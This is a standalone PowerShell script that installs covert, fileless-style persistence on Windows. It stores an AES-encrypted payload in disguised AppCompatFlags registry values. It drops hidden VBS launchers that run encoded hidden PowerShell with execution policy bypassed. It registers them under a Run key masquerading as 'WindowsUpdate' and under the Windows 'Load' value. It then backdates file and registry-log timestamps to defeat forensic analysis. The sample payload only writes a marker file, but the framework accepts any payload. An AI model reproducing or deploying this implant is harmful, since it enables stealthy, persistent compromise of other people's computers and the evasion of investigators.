# Define plaintext payload
$p1 = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"

# PRIMARY
$a1 = [System.Security.Cryptography.Aes]::Create()
$a1.KeySize = 256; $a1.BlockSize = 128
$a1.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$a1.GenerateKey(); $a1.GenerateIV()
$e1 = $a1.CreateEncryptor()
$b1 = [System.Text.Encoding]::UTF8.GetBytes($p1)
$c1 = $e1.TransformFinalBlock($b1, 0, $b1.Length)
$e64 = [Convert]::ToBase64String($c1)
$k64 = [Convert]::ToBase64String($a1.Key)
$i64 = [Convert]::ToBase64String($a1.IV)
$rp1 = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
if (-not (Test-Path $rp1)) { New-Item -Path $rp1 -Force | Out-Null }
New-ItemProperty -Path $rp1 -Name "CacheData" -Value "$e64|$k64|$i64" -PropertyType String -Force | Out-Null
$s1 = @'
$b=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers' -Name 'CacheData').CacheData
$x=$b -split '\|'
$a=[System.Security.Cryptography.Aes]::Create()
$a.KeySize=256;$a.BlockSize=128
$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$a.Key=[Convert]::FromBase64String($x[1])
$a.IV=[Convert]::FromBase64String($x[2])
$d=$a.CreateDecryptor()
$n=[Convert]::FromBase64String($x[0])
$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
Invoke-Expression $m
'@
$l1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s1))
$vbs1 = "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\mshelper.vbs"
if (-not (Test-Path (Split-Path $vbs1))) { New-Item -Path (Split-Path $vbs1) -ItemType Directory -Force | Out-Null }
$vc1 = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
$vc1 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $l1"", 0, False"
Set-Content -Path $vbs1 -Value $vc1 -Encoding ASCII
(Get-Item -Path $vbs1 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
$pk1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
if (-not (Test-Path $pk1)) { New-Item -Path $pk1 -Force | Out-Null }
New-ItemProperty -Path $pk1 -Name "WindowsUpdate" -Value "wscript.exe //B //Nologo `"$vbs1`"" -PropertyType String -Force | Out-Null

# BACKUP
$a2 = [System.Security.Cryptography.Aes]::Create()
$a2.KeySize = 256; $a2.BlockSize = 128
$a2.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a2.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$a2.GenerateKey(); $a2.GenerateIV()
$e2 = $a2.CreateEncryptor()
$b2 = [System.Text.Encoding]::UTF8.GetBytes($p1)
$c2 = $e2.TransformFinalBlock($b2, 0, $b2.Length)
$e642 = [Convert]::ToBase64String($c2)
$k642 = [Convert]::ToBase64String($a2.Key)
$i642 = [Convert]::ToBase64String($a2.IV)
$rp2 = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"
if (-not (Test-Path $rp2)) { New-Item -Path $rp2 -Force | Out-Null }
New-ItemProperty -Path $rp2 -Name "CompatData" -Value "$e642|$k642|$i642" -PropertyType String -Force | Out-Null
$s2 = @'
$b=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom' -Name 'CompatData').CompatData
$x=$b -split '\|'
$a=[System.Security.Cryptography.Aes]::Create()
$a.KeySize=256;$a.BlockSize=128
$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$a.Key=[Convert]::FromBase64String($x[1])
$a.IV=[Convert]::FromBase64String($x[2])
$d=$a.CreateDecryptor()
$n=[Convert]::FromBase64String($x[0])
$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
Invoke-Expression $m
'@
$l2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s2))
$vbs2 = "$env:APPDATA\Microsoft\Internet Explorer\UserData\iehelper.vbs"
if (-not (Test-Path (Split-Path $vbs2))) { New-Item -Path (Split-Path $vbs2) -ItemType Directory -Force | Out-Null }
$vc2 = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
$vc2 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $l2"", 0, False"
Set-Content -Path $vbs2 -Value $vc2 -Encoding ASCII
(Get-Item -Path $vbs2 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
$wk = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
if (-not (Test-Path $wk)) { New-Item -Path $wk -Force | Out-Null }
New-ItemProperty -Path $wk -Name "Load" -Value "wscript.exe //B //Nologo `"$vbs2`"" -PropertyType String -Force | Out-Null

# TIMESTAMPS
$dt = [DateTime]"2023-03-12 08:42:00"
foreach ($tp in @($vbs1, $vbs2)) {
    try { $fi = Get-Item -Path $tp -Force -ErrorAction Stop; $fi.CreationTime = $dt; $fi.LastWriteTime = $dt; $fi.LastAccessTime = $dt } catch {}
}
try { $g1 = Get-Item -Path "$env:USERPROFILE\NTUSER.DAT.LOG1" -Force -ErrorAction Stop; $g1.LastWriteTime = $dt; $g1.LastAccessTime = $dt } catch {}
try { $g2 = Get-Item -Path "$env:USERPROFILE\NTUSER.DAT.LOG2" -Force -ErrorAction Stop; $g2.LastWriteTime = $dt; $g2.LastAccessTime = $dt } catch {}
try { $h1 = Get-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\WebCache" -Force -ErrorAction Stop; $h1.LastAccessTime = $dt } catch {}
try { $h2 = Get-Item -Path "$env:APPDATA\Microsoft\Internet Explorer\UserData" -Force -ErrorAction Stop; $h2.LastAccessTime = $dt } catch {}
